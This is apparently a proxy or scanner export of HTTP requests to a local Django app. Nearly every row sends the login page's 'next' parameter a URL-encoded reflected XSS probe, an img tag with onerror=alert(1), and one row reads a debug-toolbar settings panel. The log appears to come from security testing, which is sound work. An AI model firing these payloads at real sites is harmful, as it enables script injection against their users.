ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
8262,Wed Dec 11 20:01:24 EST 2024,Wed Dec 11 20:01:24 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,114,919,16375

8269,Wed Dec 11 20:01:24 EST 2024,Wed Dec 11 20:01:24 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,73,935,16374

8270,Wed Dec 11 20:01:25 EST 2024,Wed Dec 11 20:01:25 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,43,932,16374

8271,Wed Dec 11 20:01:25 EST 2024,Wed Dec 11 20:01:25 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,50,933,16376

8275,Wed Dec 11 20:01:25 EST 2024,Wed Dec 11 20:01:26 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,110,933,16375

8276,Wed Dec 11 20:01:26 EST 2024,Wed Dec 11 20:01:26 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,255,934,16374

8280,Wed Dec 11 20:01:27 EST 2024,Wed Dec 11 20:01:27 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,217,934,16374

8281,Wed Dec 11 20:01:27 EST 2024,Wed Dec 11 20:01:27 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,60,931,16376

8285,Wed Dec 11 20:01:28 EST 2024,Wed Dec 11 20:01:28 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,391,933,16374

8287,Wed Dec 11 20:01:29 EST 2024,Wed Dec 11 20:01:29 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,44,918,16374

8290,Wed Dec 11 20:01:29 EST 2024,Wed Dec 11 20:01:29 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,88,919,16375

8294,Wed Dec 11 20:01:30 EST 2024,Wed Dec 11 20:01:30 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,97,935,16376

8295,Wed Dec 11 20:01:30 EST 2024,Wed Dec 11 20:01:30 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,55,934,16374

8297,Wed Dec 11 20:01:30 EST 2024,Wed Dec 11 20:01:30 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,50,918,16374

8300,Wed Dec 11 20:01:31 EST 2024,Wed Dec 11 20:01:31 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,59,921,16376

8304,Wed Dec 11 20:01:31 EST 2024,Wed Dec 11 20:01:32 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,66,918,16374

8308,Wed Dec 11 20:01:32 EST 2024,Wed Dec 11 20:01:32 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,89,917,16376

8309,Wed Dec 11 20:01:32 EST 2024,Wed Dec 11 20:01:33 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,70,918,16376

8313,Wed Dec 11 20:01:33 EST 2024,Wed Dec 11 20:01:33 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,68,914,16376

8314,Wed Dec 11 20:01:33 EST 2024,Wed Dec 11 20:01:33 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,63,933,16374

8315,Wed Dec 11 20:01:34 EST 2024,Wed Dec 11 20:01:34 EST 2024,GET,http://localhost:8000/__debug__/render_panel/?store_id=329d42a5c2f044eaa6ae9f787e489455&panel_id=SettingsPanel,200,OK,60,258,34970

8319,Wed Dec 11 20:01:34 EST 2024,Wed Dec 11 20:01:34 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,29,933,16374

8323,Wed Dec 11 20:01:35 EST 2024,Wed Dec 11 20:01:35 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,68,919,16375

8327,Wed Dec 11 20:01:37 EST 2024,Wed Dec 11 20:01:37 EST 2024,GET,http://localhost:8000/api-auth/login/?next=%3Cimg%20src=%22random.gif%22%20onerror=alert(1)%3E,200,OK,71,933,16374

